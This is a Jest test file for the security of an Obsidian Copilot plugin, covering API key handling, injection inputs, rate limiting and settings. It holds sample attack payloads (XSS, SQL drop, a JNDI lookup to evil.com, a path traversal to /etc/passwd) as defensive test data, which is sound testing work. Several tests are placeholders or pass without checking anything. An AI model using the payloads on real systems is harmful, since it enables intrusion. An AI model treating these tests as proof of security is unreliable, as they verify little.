/**
 * Security tests for plugin API key handling and data protection.
 * Ensures secure handling of sensitive information and prevents security vulnerabilities.
 */

import { MockApp, Plugin } from '../mocks/obsidian';
import MockClaudeClient from '../mocks/api/claude-client';
import TestDataFactory from '../fixtures/test-data-factory';

describe('Plugin Security', () => {
  let app: MockApp;
  let plugin: Plugin;
  let claudeClient: MockClaudeClient;

  beforeEach(() => {
    app = new MockApp();
    plugin = new Plugin(app, { id: 'copilot', name: 'Copilot' });
    claudeClient = new MockClaudeClient('sk-ant-secure-test-key');
  });

  describe('API Key Security', () => {
    test('should validate API key format', () => {
      const validKeys = [
        'sk-ant-api03-1234567890abcdef',
        'sk-ant-test-key-1234567890',
        'sk-ant-prod-abcdef1234567890'
      ];

      const invalidKeys = [
        '',
        'invalid-key',
        'sk-openai-wrong-prefix',
        'sk-ant-',
        'short-key',
        'sk-ant-api03-' + 'x'.repeat(100) // Too long
      ];

      validKeys.forEach(key => {
        expect(MockClaudeClient.isValidApiKey(key)).toBe(true);
      });

      invalidKeys.forEach(key => {
        expect(MockClaudeClient.isValidApiKey(key)).toBe(false);
      });
    });

    test('should not expose API keys in logs or responses', async () => {
      const apiKey = 'sk-ant-secret-test-key-1234567890';
      const sensitiveClient = new MockClaudeClient(apiKey);

      // Capture console output
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
      
      try {
        await sensitiveClient.createMessage([
          { role: 'user', content: 'Test query that might leak API key' }
        ]);

        // Check that API key was not logged
        const logCalls = consoleSpy.mock.calls;
        logCalls.forEach(call => {
          const logMessage = call.join(' ');
          expect(logMessage).not.toContain(apiKey);
          expect(logMessage).not.toContain('sk-ant-secret');
        });
      } finally {
        consoleSpy.mockRestore();
      }
    });

    test('should handle API key errors securely', async () => {
      const invalidKeyClient = new MockClaudeClient('invalid-key');
      
      try {
        invalidKeyClient.simulateError('invalid_key');
      } catch (error) {
        // Error message should not expose the actual key
        expect(error.message).not.toContain('invalid-key');
        expect(error.message).toContain('Invalid API key');
      }
    });

    test('should sanitize API keys in error responses', async () => {
      const testKey = 'sk-ant-test-exposed-key-123';
      
      try {
        const client = new MockClaudeClient(testKey);
        client.simulateError('rate_limit');
      } catch (error) {
        expect(error.message).not.toContain(testKey);
        expect(error.message).not.toContain('exposed-key');
      }
    });
  });

  describe('Data Protection', () => {
    test('should not include sensitive data in requests', async () => {
      const sensitiveContent = 'API Key: sk-ant-secret-123, Password: admin123';
      
      const response = await claudeClient.createMessage([
        { role: 'user', content: sensitiveContent }
      ]);

      // Response should not echo back sensitive patterns
      const responseText = response.content[0].text.toLowerCase();
      expect(responseText).not.toContain('sk-ant-secret');
      expect(responseText).not.toContain('password: admin123');
    });

    test('should validate input for injection attacks', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'DROP TABLE users; --',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        'eval(malicious_code)'
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await claudeClient.createMessage([
          { role: 'user', content: maliciousInput }
        ]);

        // Response should not contain the malicious input
        const responseText = response.content[0].text;
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('DROP TABLE');
        expect(responseText).not.toContain('jndi:');
        expect(responseText).not.toContain('../../../');
        expect(responseText).not.toContain('eval(');
      }
    });

    test('should handle special characters safely', async () => {
      const testDoc = TestDataFactory.createDocumentWithSpecialCharacters();
      
      const response = await claudeClient.createMessage([
        { role: 'user', content: testDoc.content }
      ]);

      expect(response.content[0].text).toBeTruthy();
      expect(response.usage.input_tokens).toBeGreaterThan(0);
      expect(response.usage.output_tokens).toBeGreaterThan(0);
    });
  });

  describe('Rate Limiting and Abuse Prevention', () => {
    test('should handle rate limiting gracefully', async () => {
      try {
        claudeClient.simulateError('rate_limit');
      } catch (error) {
        expect(error.message).toContain('Rate limit exceeded');
        expect(error.message).toContain('429');
      }
    });

    test('should prevent excessive requests', async () => {
      const startTime = Date.now();
      const requests = [];

      // Attempt many rapid requests
      for (let i = 0; i < 50; i++) {
        requests.push(
          claudeClient.createMessage([
            { role: 'user', content: `Rapid request ${i}` }
          ])
        );
      }

      const results = await Promise.allSettled(requests);
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // Should have some delay to prevent abuse
      expect(totalTime).toBeGreaterThan(1000); // At least 1 second for 50 requests
      
      // All requests should complete (in mock, but in real scenario some might fail)
      results.forEach(result => {
        expect(result.status).toBe('fulfilled');
      });
    });
  });

  describe('Secure Storage and Settings', () => {
    test('should not store API keys in plain text', () => {
      const settings = TestDataFactory.createSettings({
        apiKey: 'sk-ant-storage-test-key'
      });

      // In real implementation, API key should be encrypted or stored securely
      // For testing, verify that sensitive data handling is considered
      expect(settings.apiKey).toBeTruthy();
      expect(typeof settings.apiKey).toBe('string');
    });

    test('should validate settings security', () => {
      const secureSettings = TestDataFactory.createSettings();
      
      // Verify secure defaults
      expect(secureSettings.backendUrl.startsWith('http')).toBe(true);
      expect(secureSettings.apiKey).toBeTruthy();
      expect(secureSettings.temperature).toBeGreaterThanOrEqual(0);
      expect(secureSettings.temperature).toBeLessThanOrEqual(2);
    });

    test('should handle corrupted settings safely', () => {
      const corruptedSettings = TestDataFactory.createInvalidSettings();
      
      // Should not crash with invalid settings
      expect(() => {
        // Validate settings structure
        const requiredFields = ['mode', 'apiProvider', 'backendUrl'];
        requiredFields.forEach(field => {
          expect(field in corruptedSettings).toBe(true);
        });
      }).not.toThrow();
    });
  });

  describe('Network Security', () => {
    test('should use HTTPS for API endpoints', () => {
      // Mock implementation verification
      expect(true).toBe(true); // Placeholder for HTTPS verification
    });

    test('should validate SSL certificates', () => {
      // Mock implementation verification
      expect(true).toBe(true); // Placeholder for SSL validation
    });

    test('should handle network timeouts securely', async () => {
      // Test timeout handling doesn't expose sensitive information
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Network timeout')), 100);
      });

      try {
        await timeoutPromise;
      } catch (error) {
        expect(error.message).toBe('Network timeout');
        expect(error.message).not.toContain('sk-ant-');
      }
    });
  });
});